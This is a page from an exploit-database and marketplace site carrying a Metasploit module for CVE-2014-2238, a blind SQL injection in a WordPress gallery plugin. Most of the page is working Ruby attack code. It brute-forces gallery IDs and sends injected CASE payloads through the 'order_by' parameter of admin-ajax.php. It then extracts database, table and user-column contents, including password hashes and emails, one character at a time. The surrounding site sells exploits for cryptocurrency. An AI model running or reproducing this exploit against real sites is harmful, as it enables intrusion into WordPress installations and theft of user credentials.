			<meta name='description' content=""> 
			<meta name='keywords' content=""> 
		
		<link rel='stylesheet' href='/style?1592065323' type='text/css' media='all' />
		<link rel='stylesheet' href='/skin/green?1592065323' type='text/css' media='all' />
		<link rel='stylesheet' href='/qtip_style' type='text/css' media='all' />
		<link rel='stylesheet' href='/fancybox_style' >
		<script type='text/javascript' src='/jquery'></script>
		<script type='text/javascript' src='/qtip_js'></script>
		<script type='text/javascript' src='/upl1'></script>
		<script type='text/javascript' src='/upl2'></script>
		<script type='text/javascript' src='/fancybox'></script>
		<script src='/chart_js'></script>
		<script type='text/javascript'>
			$(document).ready(function() {
				$('.popup').fancybox({
					fitToView	: true,
					autoSize	: true,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
				$('.popup_modal').fancybox({
					modal	: true, 
					width   : '100%',
					height  : '100%',
					fitToView	: true,
					autoSize	: false,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
			});
		</script>
		<script type='text/javascript'>
			  var _gaq = _gaq || [];
			  _gaq.push(['_setAccount', 'UA-23466659-1']);
			  _gaq.push(['_trackPageview']);
			  (function() {
				var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
			  })();
		</script>
	</head>
	<body  onload='onloadpage()' ><div class='menu' style='text-align:center; width:1200px;'>[ <a href='/'>home</a> ]&nbsp;&nbsp;[ <a href='/private' class=''>private</a> ]&nbsp;&nbsp;[ <a href='/0day' class='RedText'>0Day</a> ]&nbsp;&nbsp;[ <a href='/discount'>discount</a> ]&nbsp;&nbsp;[ <a href='/gold' class='YellowTextGold'> Get Gold </a> ]&nbsp;&nbsp;[ <a href='/platforms'>platforms</a> ]&nbsp;&nbsp;[ <a href='/pentest'>pentest</a> ]&nbsp;&nbsp;[ <a href='/hash'>hash</a> ]&nbsp;&nbsp;[ <a href='/search'>search</a> ]&nbsp;&nbsp;[ <a href='/faq' class='RedText'>faq</a> ]&nbsp;&nbsp;[ <a href='/contacts'>contact</a> ]&nbsp;&nbsp;[ <a href='/style/change' alt=''>style</a> ]&nbsp;&nbsp;[ <a href='/btc/change' class='YellowTextBtc'>Prices in Gold</a> ]&nbsp;&nbsp;&nbsp;<span class='YellowText'>db:</span> <span class='RedText'>34 387</span>&nbsp;&nbsp;&nbsp;&nbsp;<div class='menu_icon'><a title='0day Today Exploit DB Official Facebook' href='http://www.facebook.com/Inj3ct0rs' target='_Blank'><img src='/img/fb.png' alt='0day Today Exploit DB Official Facebook'></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official Twitter ' href='http://twitter.com/Inj3ct0r' target='_Blank'><img src='/img/tw.png' alt='0day Today Exploit DB Official Twitter '></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official RSS Channel' href='/rss' target='_Blank'><img src='/img/rss.png' alt='0day Today Exploit DB Official RSS Channel'></a></div> <div class='menu_icon'><a title='Tor Network' href='http://mvfjfugdwgc5uwho.onion' target='_Blank'><img src='/img/tor3.png' alt='Tor'></a></div> </div><div class='content'>
				<div class='popup_welcome ' id='popup_welcome_div'>
					<a href='#popup_welcome_div' class='popup' id='popup_welcome'>&nbsp;</a>
					<div class='pop_up_welcome_title'>
						<strong><span class='RedText'>0day.today - Biggest Exploit Database in the World.</span></strong>
						<div style='float:right; margin-top:-5px; heigth:24px; line-height:16px; '>
							<div style='float:left; margin-top:3px;'>Select your language: &nbsp;</div>
							<a class='' href='http://en.0day.today/exploit/23113'>
								<img src='/img/langs/en.png' alt='English'>
								<div class='TipText'>
									English
								</div>
							</a><a class='' href='http://ru.0day.today/exploit/23113'>
								<img src='/img/langs/ru.png' alt='Русский'>
								<div class='TipText'>
									Русский
								</div>
							</a><a class='' href='http://de.0day.today/exploit/23113'>
								<img src='/img/langs/de.png' alt='Deutsch'>
								<div class='TipText'>
									Deutsch
								</div>
							</a><a class='' href='http://tr.0day.today/exploit/23113'>
								<img src='/img/langs/tr.png' alt='Türkçe'>
								<div class='TipText'>
									Türkçe
								</div>
							</a><a class='' href='http://fr.0day.today/exploit/23113'>
								<img src='/img/langs/fr.png' alt='Français'>
								<div class='TipText'>
									Français
								</div>
							</a><a class='' href='http://it.0day.today/exploit/23113'>
								<img src='/img/langs/it.png' alt='Italiano'>
								<div class='TipText'>
									Italiano
								</div>
							</a><a class='' href='http://es.0day.today/exploit/23113'>
								<img src='/img/langs/es.png' alt='Español'>
								<div class='TipText'>
									Español
								</div>
							</a><a class='' href='http://ro.0day.today/exploit/23113'>
								<img src='/img/langs/ro.png' alt='Romania'>
								<div class='TipText'>
									Romania
								</div>
							</a><a class='' href='http://pl.0day.today/exploit/23113'>
								<img src='/img/langs/pl.png' alt='Polskie'>
								<div class='TipText'>
									Polskie
								</div>
							</a><a class='' href='http://ar.0day.today/exploit/23113'>
								<img src='/img/langs/ar.png' alt='العربية'>
								<div class='TipText'>
									العربية
								</div>
							</a><a class='' href='http://jp.0day.today/exploit/23113'>
								<img src='/img/langs/jp.png' alt='Japan'>
								<div class='TipText'>
									Japan
								</div>
							</a><a class='' href='http://cn.0day.today/exploit/23113'>
								<img src='/img/langs/cn.png' alt='China'>
								<div class='TipText'>
									China
								</div>
							</a>
						</div>
					</div>
					
					<div style='float:left; background:#000; width:480px; border-right:1px solid #004000; text-align:justify; margin:10px 0px 0px 0px; padding:0px 15px 0px 0px;'>
						<div class='centertext'><img src='/img/logo_green.jpg' style='width:400px;'></div>
						<div class='spacer'></div>
						Things you should know about 0day.today: 
						<ul>
						<li>We use one main domain: <a href='http://0day.today'>http://0day.today</a></li>
						<li>Most of the materials is <span class='YellowText'>completely FREE</span></li>
						<li>If you want to <span class='RedText'>purchase the exploit</span> / <span class='RedText'>get V.I.P. access</span>  or pay for any other service, <br>you need to buy or earn <img src='/img/gold.gif'> <span class='GoldText'>GOLD</span></li>
					</ul>
						
						<div class='spacer'></div>
						<div class='center'>
							We accept currencies: [<a href='/contacts' target=_blank>contact admin to find more</a>]
							<div class='half_spacer'></div>
							<a href='/gold'><img src='/img/bitcoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/litecoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/ethereum.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							
						</div>
						<div class='spacer'></div>
						<div class='spacer'></div>
						We don't want you to use our site as a tool for hacking purposes, so any kind of action that could 
			affect illegaly other users or websites that you don't have right to access will be banned 
			and your account including your data will be destroyed.<br><br>
			Administration of this site uses the <a href='/contacts' target=_blank>official contacts</a>. Beware of impostors!
						<div class='spacer'></div>
						<div class='spacer'></div>
						<div class='centertext'><a href='/popup/off' class='RedText'>I am registered user of 0day.today. I don't want to see this screen in future.</a></div>
						
					</div>
					<div style='float:left; background:#000; width:300px; padding:10px 0px;'>
						<center><strong><span class='RedText'>What to do first?</span></strong></center>
						<ol style='margin-left:25px;'>
							<li>Read the [ <a href='/law' target='_blank'>agreement</a> ]</li>
							<li>Read the [ <a href='/faq/how_publish' target='_blank'>Submit</a> ] rules</li>
							<li>Visit the [ <a href='/faq' target='_blank'>faq</a> ] page</li>
							<li>[ <a href='/reg' target='_blank'>Register</a> ] profile</li>
							<li>Get [ <a href='/gold' target='_blank'>GOLD</a> ]</li>
							<li>If you want to [ <a href='/faq/sell' target='_blank'>sell</a> ]</li>
							<li>If you want to [ <a href='/faq/buy' target='_blank'>buy</a> ]</li>
							<li>If you lost [ <a href='restore' target='_blank'>Account</a> ]</li>
							<li>Any questions [ <a href='mailto:admin@0day.today'>admin@0day.today</a> ]</li>
						</ol>
						<br>
						<br>
						
						<center><strong><span class='RedText'>Main links</span></strong></center>
						<ul style='margin-left:25px;'>
							<li><a href='/auth'>Authorisation page</a></li>
							<li><a href='/reg'>Registration page</a></li>
							<li><a href='/restore'>Restore account page</a></li>
							<li><a href='/faq'>FAQ page</a></li>
							<li><a href='/contacts'>Contacts page</a></li>
							<li><a href='/faq#submit'>Publishing rules</a></li>
							<li><a href='/law'>Agreement page</a></li>
						</ul>
						<br>
						<br>
						
						<center><strong><span class='RedText'>You can contact us by</span></strong></center><br>
						<div class='popup_contacts_items popup_contacts_mail'>
							<div class='popup_contacts_items_title '>Mail:</div> 
							<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
						</div>
						<!--<div class='popup_contacts_items popup_contacts_jabber'>
							<div class='popup_contacts_items_title '>Jabber:</span></strong></div> 
							<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
						</div>
						<div class='popup_contacts_items popup_contacts_skype'>
							<div class='popup_contacts_items_title '>Skype:</span></strong></div> 
							<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
						</div>
						-->
						<div class='popup_contacts_items popup_contacts_fb'>
							<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
						</div>
						<div class='popup_contacts_items popup_contacts_twitter'>
							<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
						</div>
					</div>
				</div>
		<div class='head_auth'>
				<div class='menu_icon'><img src='/img/lock.png'></a></div> 
				[ <a href='/auth' class='RedText'>authorization</a> ] 
				[ <a href='/reg' class='RedText'>registration</a> ] 
				[ <a href='/restore' class='RedText'>restore account</a> ] 
			</div>
			<div class='head_contacts '>
				<a href='#contacts_popup' class='popup'>
				<img src='/img/mail3.png'>
				Contact us
				<!--<img src='/img/skype.png'>
				<img src='/img/jabber.png'>-->
				
				</a>
			</div>
			<div id='contacts_popup'>
				<div class='category_text strong'><span class='RedText'>You can contact us by:</span> </div>
				<div class='spacer'></div>
				<div class='popup_contacts_page'>
					<div class='popup_contacts_items popup_contacts_mail'>
						<div class='popup_contacts_items_title '>Mail:</div> 
						<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
					</div>
					
					<!--<div class='popup_contacts_items popup_contacts_jabber'>
						<div class='popup_contacts_items_title YellowText'>Jabber:</span></strong></div> 
						<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
					</div>
					<div class='popup_contacts_items popup_contacts_skype'>
						<div class='popup_contacts_items_title YellowText'>Skype:</span></strong></div> 
						<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
					</div>-->
					
					<div class='popup_contacts_items popup_contacts_fb'>
						<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
					</div>
					<div class='popup_contacts_items popup_contacts_twitter'>
						<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
					</div>
				</div>
			</div>
			
			
				<div class='head'>
					<div class='double_spacer'></div>
					<div class='double_spacer'></div><a href='/'><img src='/img/logo_green.jpg' alt='0day Today Exploits Market and 0day Exploits Database'></a>
					
					
				</div>
						
				
					<style>
					.fancybox-inner {
						background:#000000 url(/img/bg.gif);
					}
					.content{border:1px solid #008000; }
					</style>
					
						
						<script type='text/javascript' src='/hightlight_lib'></script>
						<script type='text/javascript' src='/hightlight/ruby'></script>
						
						<link type='text/css' rel='stylesheet' href='/hightlight_style?1592065323'/>
						<script type='text/javascript'>SyntaxHighlighter.all();</script>
						
						
						
						
							<div style='font-size:11px; font-weight:bold;'>
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Author</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/author/2911' target=_blank>metasploit</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Risk</div>
									<div style='float:left; width:190px; margin:5px 0px 0px 0px;' ><img src='/img/risk/critlow_3.gif'> [<span style='font-size:9px;'><div class='tips_risk_color_3'>Security Risk High</div></span>]</div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>0day-ID</div>
									<div style='float:left; margin:5px 0px 0px 0px;' ><a href='/exploit/description/23113' target=_blank>0day-ID-23113</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Category</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/remote'>remote exploits</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Date add</div>
									<div style='float:left; width:190px;margin:5px 0px 0px 0px;' ><a href='/date/14-01-2015'>14-01-2015</a></div>
									
											<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>CVE</div>
											<div style='float:left; margin:5px 0px 0px 0px;' ><a href='/search?search_request=&search_type=1&category=-1&platform=-1&price_from=0&price_to=10000&author_login=&cve=CVE-2014-2238' target=_blank>CVE-2014-2238</a></div>
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Platform</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/platforms/php'>php</a></div>
									
									
								<div class='clear'></div>
									
							</div>
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Description'    => %q{
      users tables, including password hashes. This module was tested against version 1.2.7.
      },
      'License'        => 'ExploitHub',
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module
        ],
      'References'     =>
        [
          ['CVE', '2014-2238'],
        ],
      'Platform'       => ['win', 'linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 28 2014"))

      register_options(
      [
        OptInt.new('GALLERYID', [false, 'Gallery ID to use. If not provided, the module will attempt to bruteforce one.', nil]),
      ], self.class)
  end

  def get_params
    {
      'tag_id' => 0,
      'action' => 'GalleryBox',
      'current_view' => 0,
      'image_id' => 1,
      'gallery_id' => 1,
      'theme_id' => 1,
      'thumb_width' => 180,
      'thumb_height' => 90,
      'open_with_fullscreen' => 0,
      'open_with_autoplay' => 0,
      'image_width' => 800,
      'image_height' => 500,
      'image_effect' => 'fade',
      'sort_by' => 'order',
      'order_by' => 'asc',
      'enable_image_filmstrip' => 1,
      'image_filmstrip_height' => 70,
      'enable_image_ctrl_btn' => 1,
      'enable_image_fullscreen' => 1,
      'popup_enable_info' => 1,
      'popup_info_always_show' => 0,
      'popup_info_full_width' => 0,
      'popup_hit_counter' => 0,
      'popup_enable_rate' => 0,
      'slideshow_interval' => 5,
      'enable_comment_social' => 1,
      'enable_image_facebook' => 1,
      'enable_image_twitter' => 1,
      'enable_image_google' => 1,
      'enable_image_pinterest' => 0,
      'enable_image_tumblr' => 0,
      'watermark_type' => 'none',
      'current_url' => ''
    }
  end

  def bruteforce_gallery_id
    1.upto(666) do |i|
      get_vars = get_params
      get_vars['gallery_id'] = i
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_get' => get_vars
      })

      return i if res and res.body =~ /data\["0"\] = \[\];/
    end

    fail_with(Failure::Unknown, "Couldn't bruteforce a gallery ID, please explicitly supply a known good gallery ID")
  end

  def run
    gallery_id = datastore['GALLERYID']

    if gallery_id == 0
      print_status('No GALLERYID supplied, attempting bruteforce.')
      gallery_id = bruteforce_gallery_id
      print_status("Found a gallery with an ID of #{gallery_id}")
    end

    parms = get_params
    parms['gallery_id'] = gallery_id

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_get' => parms
    })

    real_length = res.body.length

    count = nil
    1.upto(999) do |i|
      payload = ",(SELECT (CASE WHEN ((SELECT IFNULL(COUNT(DISTINCT(schema_name)),0x20) FROM INFORMATION_SCHEMA.SCHEMATA) BETWEEN 0 AND #{i}) THEN 0x2061736320 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

      res = send_injected_request(payload, gallery_id)

      count = i if res.body.length == real_length
      break if count
    end

    print_status("Looks like there are #{count} databases.")

    schemas = []
    0.upto(count-1) do |i|
      length = nil

      1.upto(999) do |c|
        payload = ",(SELECT (CASE WHEN ((SELECT IFNULL(CHAR_LENGTH(schema_name),0x20) FROM (SELECT DISTINCT(schema_name) "
        payload << "FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1) AS pxqq) BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 6586*"
        payload << "(SELECT 6586 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

        res = send_injected_request(payload, gallery_id)

        length = c if res.body.length == real_length
        break if !length.nil?
      end

      print_status("Schema #{i}'s name has a length of #{length}. Getting name.")

      name = ''
      1.upto(length) do |l|
        126.downto(32) do |c|
          payload = ",(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(schema_name AS CHAR),0x20) FROM (SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1) AS lela),#{l},1)) NOT BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 7601*(SELECT 7601 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

          res = send_injected_request(payload, gallery_id)

          vprint_status("Found char #{(c+1).chr}") if res.body.length == real_length
          name << (c+1).chr if res.body.length == real_length
          break if res.body.length == real_length
        end
      end
      schemas << name
      print_status("Found database #{name}")
    end

    schemas.delete('mysql')
    schemas.delete('performance_schema')
    schemas.delete('information_schema')

    schemas.each do |schema|
      num_tables = nil
      1.upto(999) do |i|
        payload = ",(SELECT (CASE WHEN ((SELECT IFNULL(COUNT(table_name),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{schema.unpack("H*")[0]}) BETWEEN 0 AND #{i}) THEN 0x2061736320 ELSE 8846*(SELECT 8846 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

        res = send_injected_request(payload, gallery_id)

        num_tables = i if res.body.length == real_length
        break if num_tables
      end

      print_status("Schema #{schema} has #{num_tables} tables. Enumerating.")

      tables = []
      0.upto(num_tables - 1) do |t|
        length = nil
        0.upto(64) do |l|
          payload = ",(SELECT (CASE WHEN ((SELECT IFNULL(CHAR_LENGTH(table_name),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{schema.unpack("H*")[0]} LIMIT #{t},1) BETWEEN 0 AND #{l}) THEN 0x2061736320 ELSE 5819*(SELECT 5819 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

          res = send_injected_request(payload, gallery_id)

          length = l if res.body.length == real_length
          break if length
        end

        print_status("Table #{t}'s name has a length of #{length}")

        name = ''
        1.upto(length) do |l|
          126.downto(32) do |c|
            payload = ",(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{schema.unpack("H*")[0]} LIMIT #{t},1),#{l},1)) NOT BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 5819*(SELECT 5819 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

            res = send_injected_request(payload, gallery_id)

            name << (c+1).chr if res.body.length == real_length
            vprint_status("Found char #{(c+1).chr}") if res.body.length == real_length
            break if res.body.length == real_length
          end
        end
        print_status("Found table #{name}")
        tables << name if name =~ /users$/
      end

      print_status("Found #{tables.length} possible user tables. Enumerating users.")

      tables.each do |table|
        table_count = ''
        char = 'a'

        i = 1
        while char
          char = nil
          58.downto(48) do |c|
            payload = ",(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{schema}.#{table}),#{i},1)) NOT BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 8335*(SELECT 8335 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

            res = send_injected_request(payload, gallery_id)

            char = (c+1).chr if res.body.length == real_length
            vprint_status("Found char #{char}") if char
            table_count << char if char
            break if char
          end
          i = i + 1
        end

        table_count = table_count.to_i

        print_status("Table #{table} has #{table_count} rows.")
        user_cols = ["ID", "user_url", "user_pass", "user_login", "user_email", "user_status", "display_name", "user_nicename", "user_registered", "user_activation_key"]

        0.upto(table_count-1) do |t|
          user_cols.each do |col|
            i = 1
            length = '0'
            char = 'a'

            while char
              char = nil
              58.downto(48) do |c|
                payload = ",(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(#{col}) AS CHAR),0x20) FROM #{schema}.#{table} ORDER BY ID LIMIT #{t},1),#{i},1)) NOT BETWEEN 0 AND #{c}) THEN 0x2061736320 ELSE 7837*(SELECT 7837 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"

                res = send_injected_request(payload, gallery_id)

                char = (c+1).chr if res.body.length == real_length
                vprint_status("Found char #{char}") if char
                length << char if char
                break if char
              end
              i = i + 1
            end

            length = length.to_i
            print_status("Column #{col} of row #{t} has a length of #{length}")
          end
        end
      end
    end
  end

  def send_injected_request(payload, gallery_id)
    parms = get_params
    parms['gallery_id'] = gallery_id
    parms['order_by'] = 'asc ' + payload

    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_get' => parms
    })
  end

end


